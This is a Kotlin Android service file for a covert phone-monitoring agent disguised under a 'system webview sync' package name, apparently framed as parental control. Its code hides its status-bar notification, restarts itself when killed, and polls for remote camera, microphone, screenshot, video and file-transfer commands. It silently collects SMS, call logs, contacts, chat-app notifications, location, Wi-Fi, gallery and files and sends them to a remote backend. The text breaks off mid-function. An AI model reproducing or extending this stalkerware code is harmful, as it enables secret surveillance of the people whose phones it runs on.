package com.system.webview.sync.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.HandlerThread
import android.os.IBinder
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.localdb.SyncQueueHelper
import com.system.webview.sync.network.SupabaseConfig
import com.system.webview.sync.receivers.BootReceiver
import kotlinx.coroutines.runBlocking
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.net.Uri
import com.system.webview.sync.receivers.AgentDeviceAdminReceiver

class BackgroundSyncService : Service() {
    private var scheduler: ScheduledExecutorService? = null
    private var commandScheduler: ScheduledExecutorService? = null
    private val NOTIFICATION_ID = 88127
    // v3: forces channel recreation with IMPORTANCE_NONE → no status bar icon, no shade entry
    private val CHANNEL_ID = "system_webview_sync_v3"

    // V2: NetworkCallback for instant sync on connection restored
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    // Guard: thread-safe set of command IDs already dispatched.
    // ConcurrentHashMap.newKeySet() ensures atomic add-and-check across concurrent
    // scheduler threads. Persisted to SharedPreferences so it survives service restarts.
    private val executedCommandIds = java.util.concurrent.ConcurrentHashMap.newKeySet<Long>()
    private val executedCameraCommandIds = java.util.concurrent.ConcurrentHashMap.newKeySet<Long>()
    private val executedMicCommandIds          = java.util.concurrent.ConcurrentHashMap.newKeySet<Long>()
    private val executedVideoCommandIds        = java.util.concurrent.ConcurrentHashMap.newKeySet<Long>()
    private val executedFileTransferCommandIds = java.util.concurrent.ConcurrentHashMap.newKeySet<Long>()

    // V2: Trusted installer list for sideload detection
    private val TRUSTED_INSTALLERS = setOf(
        "com.android.vending",
        "com.google.android.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.miui.packageinstaller",
        "com.huawei.appmarket",
        "com.oppo.market",
        "com.vivo.appstore",
        "com.android.packageinstaller"
    )

    companion object {
        @Volatile
        private var instance: BackgroundSyncService? = null

        // Paket sosial/chat — dipakai untuk menandai notification_logs.is_chat = true
        val SOCIAL_PACKAGES = setOf(
            "com.whatsapp", "com.whatsapp.w4b",
            "org.telegram.messenger", "org.telegram.messenger.web",
            "com.instagram.android", "com.facebook.orca", "com.facebook.katana",
            "com.twitter.android", "com.x.android",
            "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
            "com.snapchat.android", "com.discord",
            "com.google.android.gm", "com.microsoft.office.outlook",
            "com.linkedin.android"
        )

        fun triggerTelemetryScan(context: Context) {
            instance?.let {
                Executors.newSingleThreadExecutor().execute {
                    it.runTelemetryAndSync(context)
                }
            } ?: android.util.Log.w("BackgroundSync", "triggerTelemetryScan: BackgroundSyncService instance null")
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        startForeground(NOTIFICATION_ID, createNotification())
        // Teknik inner-service: hapus notifikasi dari status bar setelah startForeground wajib dipanggil.
        // Pada Android 8.x, startForeground() wajib dipanggil dan tidak bisa di-suppress.
        // InnerSilentService memanggil startForeground() dengan ID yang sama lalu langsung stopSelf(),
        // sehingga notifikasi bersama itu dihapus dari shade dan status bar.
        startService(Intent(this, InnerSilentService::class.java))
        android.util.Log.d("BackgroundSync", "Service created — starting telemetry loop")

        // Restore persisted command IDs so we don't re-dispatch after a service restart
        executedCommandIds.addAll(PrefsHelper.getExecutedCommandIds(applicationContext))
        executedCameraCommandIds.addAll(PrefsHelper.getExecutedCameraCommandIds(applicationContext))
        executedMicCommandIds.addAll(PrefsHelper.getExecutedMicCommandIds(applicationContext))
        executedVideoCommandIds.addAll(PrefsHelper.getExecutedVideoCommandIds(applicationContext))

        // Schedule watchdog alarm — if this service is killed by OS,
        // the alarm will restart it within 15 minutes without user action.
        BootReceiver.scheduleWatchdog(applicationContext)

        // V2: Register network callback for instant sync on reconnect
        registerNetworkCallback()

        // Run first scan immediately
        Executors.newSingleThreadExecutor().execute {
            runTelemetryAndSync(applicationContext)
        }

        // Schedule periodic scanning every 5 minutes
        scheduler = Executors.newSingleThreadScheduledExecutor()
        scheduler?.scheduleAtFixedRate({
            runTelemetryAndSync(applicationContext)
        }, 5, 5, TimeUnit.MINUTES)

        // Schedule periodic command checking every 15 seconds for instant dashboard responsiveness
        commandScheduler = Executors.newSingleThreadScheduledExecutor()
        commandScheduler?.scheduleAtFixedRate({
            try {
                val cachedMode = PrefsHelper.getAgentMode(applicationContext)
                if (cachedMode == "ACTIVE") {
                    checkPendingScreenshotCommands(applicationContext)
                    checkPendingCameraCommands(applicationContext)
                    checkPendingMicrophoneCommands(applicationContext)
                    checkPendingVideoCommands(applicationContext)
                    checkPendingFileTransferCommands(applicationContext)
                }
            } catch (t: Throwable) {
                android.util.Log.e("BackgroundSync", "Command scheduler error", t)
            }
        }, 5, 15, TimeUnit.SECONDS)
    }

    // V2: Register network callback — trigger sync whenever internet becomes available
    private fun registerNetworkCallback() {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                android.util.Log.d("BackgroundSync", "Network tersedia — trigger sync")
                Executors.newSingleThreadExecutor().execute {
                    SyncQueueHelper.triggerSync(applicationContext)
                }
            }
        }
        cm.registerNetworkCallback(request, networkCallback!!)
    }

    private fun unregisterNetworkCallback() {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkCallback?.let { cm.unregisterNetworkCallback(it) }
        networkCallback = null
    }

    private fun nowUtcString(): String {
        val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        df.timeZone = TimeZone.getTimeZone("UTC")
        return df.format(Date())
    }

    private fun nowUtcFromMs(ms: Long): String {
        val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        df.timeZone = TimeZone.getTimeZone("UTC")
        return df.format(Date(ms))
    }

    private fun runTelemetryAndSync(context: Context) {
        if (!PrefsHelper.isPaired(context)) {
            android.util.Log.w("BackgroundSync", "Not paired — telemetry skipped")
            return
        }
        android.util.Log.d("BackgroundSync", "runTelemetryAndSync() starting")

        // Check agent_mode from Supabase, cache to SharedPreferences
        val agentMode = fetchAndCacheAgentMode(context)
        when (agentMode) {
            "UNINSTALL" -> { handleUninstallRequest(context); return }
            "DORMANT"   -> {
                updateDeviceHeartbeat(context)  // stay visible but skip all monitoring
                android.util.Log.i("BackgroundSync", "Agent DORMANT — skipping full sync")
                return
            }
            // else "ACTIVE" → continue full sync
        }

        updateDeviceHeartbeat(context)
        sendServiceHeartbeat(context)
        captureAndQueueLocation(context, force = false)
        
        // One-time initial sync of heavy/static logs (Apps, Calls, WiFi history)
        if (!PrefsHelper.isInitialSyncCompleted(context)) {
            android.util.Log.i("BackgroundSync", "Performing one-time initial static telemetry sync...")
            scanAndQueueInstalledApps(context)
            scanAndQueueCallLog(context)
            captureAndQueueWifi(context)
            PrefsHelper.setInitialSyncCompleted(context, true)
        }

        grabActiveNotifications(context)
        scanAndQueueSMS(context)
        scanAndQueueGallery(context)
        syncMonitoredKeywords(context)
        syncOcrSettings(context)

        // Sync contacts setiap 2 jam (atau sekali saat pertama kali)
        val lastContactSync = PrefsHelper.getLastContactsSyncTime(context)
        if (System.currentTimeMillis() - lastContactSync > 2 * 60 * 60 * 1000L) {
            syncContacts(context)
            PrefsHelper.setLastContactsSyncTime(context, System.currentTimeMillis())
        }

        // Scan device file system every 6 hours
        if (FileScannerHelper.shouldRescan(context)) {
            val fsUuid = PrefsHelper.getDeviceUuid(context)
            if (fsUuid != null) {
                Executors.newSingleThreadExecutor().execute {
                    FileScannerHelper.scanAndSync(context, fsUuid)
                }
            }
        }

        // Ensure sync is triggered even if queue was already populated
        SyncQueueHelper.triggerSync(context)
        android.util.Log.d("BackgroundSync", "runTelemetryAndSync() done")
    }

    private fun getBatteryLevel(context: Context): Int {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    // V2: Heartbeat via direct HTTP PATCH (not through sync queue)
    private fun updateDeviceHeartbeat(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: run {
            android.util.Log.w("BackgroundSync", "updateDeviceHeartbeat: deviceUuid is null")
            return
        }
        // V2: Use stored pairing code as parent_id (not hardcoded)
        PrefsHelper.getPairingCode(context) ?: run {
            android.util.Log.w("BackgroundSync", "updateDeviceHeartbeat: pairing code not found, skipping")
            return
        }

        val battery = getBatteryLevel(context)
        val childId   = PrefsHelper.getChildId(context)
        val childName = PrefsHelper.getChildName(context)
        val url = "${SupabaseConfig.URL}/rest/v1/devices?device_uuid=eq.$deviceUuid"
        val bodyObj = JSONObject().apply {
            put("battery_level", battery)
            put("last_heartbeat_at", nowUtcString())
            put("status", "ACTIVE")
            if (!childId.isNullOrBlank())   put("child_id",   childId)
            if (!childName.isNullOrBlank()) put("child_name", childName)
        }
        val body = bodyObj.toString()

        try {
            val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "PATCH"
            conn.setRequestProperty("apikey", SupabaseConfig.ANON_KEY)
            conn.setRequestProperty("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("Prefer", "return=minimal")
            conn.doOutput = true
            conn.outputStream.write(body.toByteArray())
            val code = conn.responseCode
            android.util.Log.d("BackgroundSync", "Heartbeat PATCH: HTTP $code for $deviceUuid")
            conn.disconnect()
        } catch (e: Exception) {
            android.util.Log.w("BackgroundSync", "Heartbeat PATCH gagal: ${e.message}")
            // Heartbeat failure is non-critical — no fallback to queue needed
        }
    }

    // V4: Kirim status service ke tabel service_heartbeats untuk diagnosis dashboard
    private fun sendServiceHeartbeat(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return

        val accessibilityActive = isAccessibilityServiceActive(context)
        val notifListenerActive = isNotifListenerActive(context)
        val battery = getBatteryLevel(context)
        val networkType = getNetworkType(context)

        val payload = JSONObject().apply {
            put("device_id", deviceUuid)
            put("accessibility_active", accessibilityActive)
            put("notif_listener_active", notifListenerActive)
            put("background_sync_active", true)
            put("battery_level", battery)
            put("network_type", networkType)
        }
        SyncQueueHelper.enqueue(context, "service_heartbeats", payload.toString())
        android.util.Log.d("BackgroundSync", "Heartbeat: acc=$accessibilityActive notif=$notifListenerActive bat=$battery% net=$networkType")
    }

    private fun isAccessibilityServiceActive(context: Context): Boolean {
        return try {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabledServices.contains(context.packageName)
        } catch (e: Exception) { false }
    }

    private fun isNotifListenerActive(context: Context): Boolean {
        return try {
            val flat = android.provider.Settings.Secure.getString(
                context.contentResolver, "enabled_notification_listeners"
            )
            flat != null && flat.contains(context.packageName)
        } catch (e: Exception) { false }
    }

    private fun getNetworkType(context: Context): String {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork) ?: return "NONE"
            when {
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
                else -> "OTHER"
            }
        } catch (e: Exception) { "UNKNOWN" }
    }

    private fun captureAndQueueLocation(context: Context, force: Boolean = false) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.w("BackgroundSync", "Location permission not granted — skipping")
            return
        }
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

            val fusedLocation: Location? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try { lm.getLastKnownLocation("fused") } catch (_: Exception) { null }
            } else null

            val location: Location? = requestFreshLocation(lm)
                ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: fusedLocation
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if (location != null) {
                val ageMs = System.currentTimeMillis() - location.time
                if (ageMs > 24 * 60 * 60 * 1000) { // 24 hours limit
                    android.util.Log.w("BackgroundSync", "Location stale (age=${ageMs / 1000}s) — ignoring")
                    return
                }

                val lat = location.latitude
                val lng = location.longitude

                if (force) {
                    android.util.Log.i("BackgroundSync", "Forced location capture: $lat, $lng")
                    saveLocationToQueue(context, deviceUuid, location)
                    PrefsHelper.setLastSavedLocation(context, lat, lng)
                    // Clear pending state
                    PrefsHelper.setPendingLocation(context, 0.0, 0.0)
                    PrefsHelper.setPendingSince(context, 0L)
                    return
                }

                // Smart location filtering logic
                val lastSaved = PrefsHelper.getLastSavedLocation(context)
                if (lastSaved.first == 0.0 && lastSaved.second == 0.0) {
                    // Case A: First ever location, save immediately
                    android.util.Log.i("BackgroundSync", "First location recorded: $lat, $lng")
                    saveLocationToQueue(context, deviceUuid, location)
                    PrefsHelper.setLastSavedLocation(context, lat, lng)
                    // Clear any pending state
                    PrefsHelper.setPendingLocation(context, 0.0, 0.0)
                    PrefsHelper.setPendingSince(context, 0L)
                } else {
                    // Calculate distance to last saved location
                    val distSaved = calculateDistance(lat, lng, lastSaved.first, lastSaved.second)
                    if (distSaved <= 100.0) {
                        // Still at same place
                        android.util.Log.d("BackgroundSync", "Device is stationary (dist to last saved = ${distSaved.toInt()}m <= 100m). Skipping.")
                        // Clear pending candidate since we are back/still at saved place
                        PrefsHelper.setPendingLocation(context, 0.0, 0.0)
                        PrefsHelper.setPendingSince(context, 0L)
                        return
                    }

                    // Moved > 100m from last saved location
                    val pending = PrefsHelper.getPendingLocation(context)
                    if (pending.first == 0.0 && pending.second == 0.0) {
                        // Case B1: No pending candidate. Set this as the new candidate.
                        android.util.Log.i("BackgroundSync", "Detected movement (>100m). Setting pending candidate at $lat, $lng")
                        PrefsHelper.setPendingLocation(context, lat, lng)
                        PrefsHelper.setPendingSince(context, System.currentTimeMillis())
                    } else {
                        // Calculate distance to pending candidate location
                        val distPending = calculateDistance(lat, lng, pending.first, pending.second)
                        if (distPending <= 100.0) {
                            // Case B2: Still close to the pending candidate. Check dwell duration.
                            val pendingSince = PrefsHelper.getPendingSince(context)
                            val dwellMs = System.currentTimeMillis() - pendingSince
                            android.util.Log.d("BackgroundSync", "Device is at pending candidate (dist = ${distPending.toInt()}m <= 100m). Dwell duration: ${dwellMs / 60000} mins.")
                            
                            // If dwelled for >= 10 minutes (600,000 ms), commit it to database
                            if (dwellMs >= 10 * 60 * 1000) {
                                android.util.Log.i("BackgroundSync", "Dwell threshold reached (>=10 mins). Committing location: $lat, $lng")
                                saveLocationToQueue(context, deviceUuid, location)
                                PrefsHelper.setLastSavedLocation(context, lat, lng)
                                // Clear pending candidate
                                PrefsHelper.setPendingLocation(context, 0.0, 0.0)
                                PrefsHelper.setPendingSince(context, 0L)
                            }
                        } else {
                            // Case B3: Moved to a completely new location while waiting. Reset pending candidate.
                            android.util.Log.i("BackgroundSync", "Device moved to a different place (>100m from pending). Resetting pending candidate to $lat, $lng")
                            PrefsHelper.setPendingLocation(context, lat, lng)
                            PrefsHelper.setPendingSince(context, System.currentTimeMillis())
                        }
                    }
                }
            } else {
                android.util.Log.w("BackgroundSync", "No location available — all providers returned null")
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "captureAndQueueLocation failed", e)
        }
    }

    private fun calculateDistance(lat1: Double, lng1: Double, lat2: Double, lng2: Double): Float {
        val results = FloatArray(1)
        try {
            Location.distanceBetween(lat1, lng1, lat2, lng2, results)
        } catch (e: Exception) {
            return Float.MAX_VALUE
        }
        return results[0]
    }

    private fun saveLocationToQueue(context: Context, deviceUuid: String, location: Location) {
        val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
            timeZone = TimeZone.getTimeZone("UTC")
        }
        val recordedAt = df.format(Date(location.time))
        val payload = JSONObject().apply {
            put("device_id", deviceUuid)
            put("latitude", location.latitude)
            put("longitude", location.longitude)
            put("accuracy", location.accuracy.toDouble())
            put("altitude", location.altitude)
            put("recorded_at", recordedAt)
        }
        SyncQueueHelper.enqueue(context, "location_logs", payload.toString())
        android.util.Log.d("BackgroundSync", "Saved location to queue: ${location.latitude}, ${location.longitude}")
    }

    private fun requestFreshLocation(lm: LocationManager, timeoutSeconds: Long = 10): Location? {
        val latch = CountDownLatch(1)
        var freshLocation: Location? = null
        var handlerThread: HandlerThread? = null
        var listener: LocationListener? = null

        try {
            handlerThread = HandlerThread("loc-capture-thread").apply { start() }
            val looper = handlerThread.looper

            listener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    freshLocation = loc
                    latch.countDown()
                }
                @Deprecated("Deprecated")
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) { latch.countDown() }
            }

            val gpsEnabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
            val networkEnabled = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

            if (gpsEnabled || networkEnabled) {
                if (gpsEnabled) {
                    android.util.Log.d("BackgroundSync", "Requesting fresh fix via gps")
                    lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, listener, looper)
                }
                if (networkEnabled) {
                    android.util.Log.d("BackgroundSync", "Requesting fresh fix via network")
                    lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, listener, looper)
                }
                latch.await(timeoutSeconds, TimeUnit.SECONDS)
            } else {
                android.util.Log.w("BackgroundSync", "No location provider enabled")
            }
        } catch (e: Exception) {
            android.util.Log.w("BackgroundSync", "requestFreshLocation failed: ${e.message}")
        } finally {
            try { listener?.let { lm.removeUpdates(it) } } catch (_: Exception) {}
            handlerThread?.quitSafely()
        }
        return freshLocation
    }

    // V2: Added is_suspicious field based on trusted installer check
    private fun scanAndQueueInstalledApps(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledPackages(0)
            android.util.Log.d("BackgroundSync", "Scanning ${packages.size} installed packages")

            for (packageInfo in packages) {
                val appPackage = packageInfo.packageName
                if (appPackage == context.packageName) continue

                val launchIntent = pm.getLaunchIntentForPackage(appPackage)
                if (launchIntent == null) {
                    android.util.Log.d("BackgroundSyncScan", "Skipped $appPackage: no launch intent")
                    continue
                }
                val appInfo = packageInfo.applicationInfo ?: continue
                val appName = appInfo.loadLabel(pm).toString()
                android.util.Log.d("BackgroundSyncScan", "Enqueued $appPackage: $appName")

                val installer = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try { pm.getInstallSourceInfo(appPackage).installingPackageName } catch (e: Exception) { null }
                } else {
                    @Suppress("DEPRECATION")
                    pm.getInstallerPackageName(appPackage)
                } ?: "unknown"

                // V2: Detect sideloaded apps
                val isSuspicious = installer.isNotEmpty()
                    && installer != "unknown"
                    && installer !in TRUSTED_INSTALLERS

                val payload = JSONObject().apply {
                    put("device_id", deviceUuid)
                    put("app_package", appPackage)
                    put("app_name", appName)
                    put("install_source", installer)
                    put("is_suspicious", isSuspicious)   // V2: New field
                }
                SyncQueueHelper.enqueue(context, "installed_apps", payload.toString())
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "scanAndQueueInstalledApps failed", e)
        }
    }

    private fun captureAndQueueWifi(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            @Suppress("DEPRECATION")
            val wifiInfo = wifiManager.connectionInfo

            val ssid = wifiInfo?.ssid?.replace("\"", "")?.takeIf { it.isNotEmpty() && it != "<unknown ssid>" }
            val bssid = wifiInfo?.bssid?.takeIf { it != "02:00:00:00:00:00" }

            if (!ssid.isNullOrEmpty() && !bssid.isNullOrEmpty()) {
                val payload = JSONObject().apply {
                    put("device_id", deviceUuid)
                    put("ssid", ssid)
                    put("bssid", bssid)
                }
                SyncQueueHelper.enqueue(context, "wifi_history_logs", payload.toString())
                android.util.Log.d("BackgroundSync", "WiFi captured: SSID=$ssid")
            } else {
                android.util.Log.d("BackgroundSync", "WiFi: not connected or SSID unavailable")
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "captureAndQueueWifi failed", e)
        }
    }

    private fun grabActiveNotifications(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        val activeNotifs = SystemSyncNotificationListenerService.getActiveNotifications() ?: run {
            android.util.Log.w("BackgroundSync", "NotificationListener instance null")
            return
        }
        android.util.Log.d("BackgroundSync", "Manually scanning ${activeNotifs.size} active notifications")

        for (sbn in activeNotifs) {
            val packageName = sbn.packageName ?: continue
            if (!SystemSyncNotificationListenerService.isTargetPackage(packageName)) continue
            if (sbn.isOngoing) continue

            val extras = sbn.notification.extras
            val title = (extras.getCharSequence("android.title") ?: extras.getString("android.title"))
                ?.toString()?.trim().takeIf { !it.isNullOrEmpty() } ?: "Unknown Sender"

            val bigText   = extras.getCharSequence("android.bigText")?.toString()?.trim()
            val shortText = extras.getCharSequence("android.text")?.toString()?.trim()
            val subText   = extras.getCharSequence("android.subText")?.toString()?.trim()

            val textLines: String? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                @Suppress("UNCHECKED_CAST")
                (extras.getCharSequenceArray("android.textLines") as? Array<CharSequence>)
                    ?.filter { it.isNotBlank() }
                    ?.joinToString("\n") { it.toString().trim() }
                    ?.trim()
                    ?.takeIf { it.isNotEmpty() }
            } else null

            val body: String = when {
                !bigText.isNullOrEmpty()   -> bigText
                !shortText.isNullOrEmpty() -> shortText
                !textLines.isNullOrEmpty() -> textLines
                !subText.isNullOrEmpty()   -> subText
                else                       -> "[Media / konten tanpa teks]"
            }

            if (NotificationHistory.isDuplicate(context, packageName, title, body)) continue

            try {
                val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
                df.timeZone = TimeZone.getTimeZone("UTC")

                val isChat = SOCIAL_PACKAGES.contains(packageName)
                val payload = JSONObject().apply {
                    put("device_id", deviceUuid)
                    put("app_package", packageName)
                    put("notification_title", title)
                    put("notification_body", body)
                    put("sender_name", title)
                    put("is_chat", isChat)
                    put("received_at", df.format(Date(sbn.postTime)))
                }
                SyncQueueHelper.enqueue(context, "notification_logs", payload.toString())
                android.util.Log.d("BackgroundSync", "Grabbed notification from $packageName (is_chat=$isChat)")
            } catch (e: Exception) {
                android.util.Log.e("BackgroundSync", "Error enqueuing notification", e)
            }
        }
    }

    // V2: Scan and queue call log (incremental — only new calls since last sync)
    private fun scanAndQueueCallLog(context: Context, forceAll: Boolean = false) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.w("BackgroundSync", "READ_CALL_LOG permission not granted — skipping")
            return
        }

        val lastSyncMs = if (forceAll) 0L else PrefsHelper.getLastCallLogSyncTime(context)
        var newCount = 0

        try {
            val cursor = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                arrayOf(
                    android.provider.CallLog.Calls.NUMBER,
                    android.provider.CallLog.Calls.CACHED_NAME,
                    android.provider.CallLog.Calls.TYPE,
                    android.provider.CallLog.Calls.DATE,
                    android.provider.CallLog.Calls.DURATION
                ),
                "${android.provider.CallLog.Calls.DATE} > ?",
                arrayOf(lastSyncMs.toString()),
                "${android.provider.CallLog.Calls.DATE} DESC"
            ) ?: return

            val syncedKeys = PrefsHelper.getSyncedCallKeys(context)
            cursor.use {
                while (it.moveToNext()) {
                    if (forceAll && newCount >= 100) {
                        break
                    }
                    val number   = it.getString(0) ?: "Unknown"
                    val name     = it.getString(1) ?: ""
                    val typeCode = it.getInt(2)
                    val date     = it.getLong(3)
                    val duration = it.getLong(4)

                    // Unique call log key: date-phoneNumber
                    val callKey = "$date-$number"
                    if (syncedKeys.contains(callKey)) {
                        continue
                    }

                    val direction = when (typeCode) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        android.provider.CallLog.Calls.MISSED_TYPE   -> "MISSED"
                        android.provider.CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        else -> "UNKNOWN"
                    }
                    val payload = JSONObject().apply {
                        put("device_id",        deviceUuid)
                        put("phone_number",     number)
                        put("contact_name",     name)
                        put("direction",        direction)
                        put("duration_seconds", duration)
                        put("recorded_at",      nowUtcFromMs(date))
                    }
                    SyncQueueHelper.enqueue(context, "calls", payload.toString())
                    PrefsHelper.addSyncedCallKey(context, callKey)
                    newCount++
                }
            }
            if (newCount > 0) {
                if (!forceAll) {
                    PrefsHelper.setLastCallLogSyncTime(context, System.currentTimeMillis())
                }
                android.util.Log.d("BackgroundSync", "Queued $newCount new call log entries (forceAll=$forceAll)")
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "scanAndQueueCallLog failed", e)
        }
    }

    // V2: Scan and queue SMS (incremental — inbox + sent)
    private fun scanAndQueueSMS(context: Context) {
        val deviceUuid = PrefsHelper.getDeviceUuid(context) ?: return
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            android.util.Log.w("BackgroundSync", "READ_SMS permission not granted — skipping")
            return
        }

        val lastSyncMs = PrefsHelper.getLastSmsSyncTime(context)
        var newCount = 0

        val smsFolders = listOf(
            Pair("inbox", android.provider.Telephony.Sms.Inbox.CONTENT_URI),
            Pair("sent",  android.provider.Telephony.Sms.Sent.CONTENT_URI)
        )

        smsFolders.forEach { (folder, uri) ->
            try {
                val cursor = context.contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date"),
                    "date > ?",
                    arrayOf(lastSyncMs.toString()),
                    "date DESC"
                ) ?: return@forEach

                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: "Unknown"
                        val body    = it.getString(1) ?: ""
                        val date    = it.getLong(2)
                        val payload = JSONObject().apply {
                            put("device_id",       deviceUuid)
                            put("sender_number",   address)
                            put("message_body",    body)
                            put("is_sent",         folder == "sent")
                            put("is_suspicious",   evaluateSuspiciousContentSimple(body))
                            put("recorded_at",     nowUtcFromMs(date))
                        }
                        SyncQueueHelper.enqueue(context, "sms_logs", payload.toString())
                        newCount++
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("BackgroundSync", "scanAndQueueSMS ($folder) failed", e)
            }
        }

        if (newCount > 0) {
            PrefsHelper.setLastSmsSyncTime(context, System.currentTimeMillis())
            android.util.Log.d("BackgroundSync", "Queued $newCount new SMS entries")
        }
    }

    // Lightweight keyword check used by SMS scanner (accessibility service has its own full version)
    private fun evaluateSuspiciousContentSimple(content: String): Boolean {
        val keywords = listOf(
            "judi", "slot", "togel", "bet", "casino",
            "porn", "bokep", "xxx",
            "bunuh", "bully", "ancam", "narkoba", "sabu", "ganja",
            "kabur", "lari dari rumah"
        )
        val lower = content.lowercase()
        return keywords.any { lower.contains(it) }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("BackgroundSync", "onStartCommand received — triggering telemetry scan")
        Executors.newSingleThreadExecutor().execute {
            runTelemetryAndSync(applicationContext)
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        instance = null
        android.util.Log.w("BackgroundSync", "Service destroyed — attempting self-restart")
        unregisterNetworkCallback()   // V2: Clean up
        scheduler?.shutdown()
        commandScheduler?.shutdown()

        // Self-restart: reschedule watchdog immediately, then try to restart service
        try {
            BootReceiver.scheduleWatchdog(applicationContext)
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "scheduleWatchdog on destroy failed", e)
        }
        try {
            val restartIntent = Intent(applicationContext, BackgroundSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("BackgroundSync", "Self-restart on destroy failed: ${e.message}")
        }
        super.onDestroy()
    }

    private fun createNotification(): Notification {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
